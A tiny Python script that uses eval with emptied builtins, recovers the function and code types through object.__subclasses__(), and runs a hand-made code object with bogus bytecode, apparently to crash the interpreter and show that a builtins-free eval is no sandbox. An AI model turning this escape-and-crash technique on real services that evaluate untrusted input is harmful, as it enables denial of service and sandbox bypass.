#! /usr/bin/env python

s = """
(lambda fc=(lambda n: [
        c for c in
            ().__class__.__bases__[0].__subclasses__()
            if c.__name__ == n
        ][0]): fc("function")(
                   fc("code")(
                   0,0,0,0,"random",(),(),(),"","",0,""),{})())()
"""

eval(s, {'__builtins__': {}})
